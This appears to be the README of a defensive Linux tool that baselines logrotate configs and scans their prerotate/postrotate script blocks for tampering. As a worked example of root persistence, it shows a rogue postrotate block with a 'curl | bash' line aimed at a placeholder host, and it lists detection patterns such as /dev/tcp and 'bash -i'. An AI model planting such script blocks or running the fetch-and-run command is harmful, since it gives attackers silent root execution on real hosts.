# logrotate-watchdog

Boot + daily delta of the logrotate config (`/etc/logrotate.conf`
+ `/etc/logrotate.d/*`) against a learned baseline, plus an
ownership + suspicious-pattern scan of the script blocks. Catches
a rogue rotation script that runs as root. MITRE **T1546** (Event
Triggered Execution).

## Why this matters

logrotate runs the `prerotate` / `postrotate` / `firstaction` /
`lastaction` / `preremove` script blocks **as root** on each
rotation — typically daily via `cron.daily/logrotate` or the
`logrotate.timer`. A rogue script block is overlooked root-exec
persistence:

```
/var/log/x.log {
    daily
    postrotate
        curl -s http://evil | bash      # runs as root, every rotation
    endscript
}
```

It hides in plain sight as routine log-management config. This is
distinct from `logfile-integrity-watchdog` (which watches log
CONTENT) — this watches the rotation SCRIPTS.

## Profiles

| Profile | Effect |
|---|---|
| `report` (default) | log delta; exit 0 |
| `enforce` | exit 1 on any logrotate change → systemd unit failed → notifier engine |

## Severity ladder

| Condition | Severity | Event |
|---|---|---|
| First scan | `ok` | `baseline_initial` |
| No logrotate config | `ok` | `no_logrotate` |
| No delta | `ok` | `logrotate_intact` |
| A config added / changed / removed | `warn` | `logrotate_changed` |
| A config world-writable / non-root-owned, OR containing a suspicious command-injection pattern | `alert` | `logrotate_suspicious` |

## What's recorded

- `file:<path>:<sha12>` — hash of each logrotate config.
- `own:<path>:<owner:mode>` — owner + mode (a world-writable /
  non-root logrotate.d file lets an attacker inject a root
  postrotate).
- `susp:<path>:<pattern>` — a high-risk exec pattern (`curl|sh`,
  `/dev/tcp`, `bash -i`, `base64 -d`, tmp/home execution, …);
  comment-only lines stripped first.

## Cadence

`OnBootSec=38min` + `OnCalendar=*-*-* 09:15:00` — extends the
staggered ladder after nfs-exports (09:10). A rogue postrotate
runs on the next daily rotation, so the boot catch confirms the
config after a restart.

## MITRE coverage

- **T1546** Event Triggered Execution — log rotation is the
  trigger that runs the script block as root.
- **T1059.004** — the script block is shell execution.
- **T1053**-adjacent — rotation is cron/timer-scheduled, so the
  payload fires on a schedule.

## Operator workflow

```bash
journalctl -t selfdef-logrotate -n 1 --no-pager
journalctl -t selfdef-logrotate-detail --since "1 day ago"

# Inventory the script blocks
grep -rnA3 -E 'prerotate|postrotate|firstaction|lastaction|preremove' \
     /etc/logrotate.conf /etc/logrotate.d/ 2>/dev/null

# Investigate a suspicious alert
cat /etc/logrotate.d/<file>      # curl|sh in postrotate? tmp exec?
sudo $EDITOR /etc/logrotate.d/<file>
sudo rm /var/lib/selfdef/logrotate-baseline.tsv
sudo systemctl start selfdef-logrotate.service
```

## Caveats

- **Legit postrotate scripts are common** (`systemctl reload
  rsyslog`, `kill -HUP`); those don't match the injection
  patterns. A new/changed config fires `warn` (re-baseline); the
  pattern + ownership tiers are the high-confidence alert.
- **Pattern set is a heuristic** — the content delta (`warn` on
  any change) is the backstop; aide-bridge / integrity-sentinel
  give byte-level integrity on the same files.
- **Daily+boot cadence** misses an inject-rotate-revert within the
  window; an audit-rules watch on `/etc/logrotate.d` writes is the
  real-time complement.

## Coexistence

- **cron-job / systemd-unit / udev / shell-init / motd-scripts /
  network-dispatcher / boot-script watchdogs**: the root-exec-on-
  event persistence family — this adds the log-rotation trigger
  surface.
- **logfile-integrity-watchdog**: log CONTENT integrity; this is
  the rotation-SCRIPT surface. Complementary log-subsystem views.
- **aide-bridge / integrity-sentinel**: byte-level integrity on
  the configs; this adds the injection-pattern + ownership view.
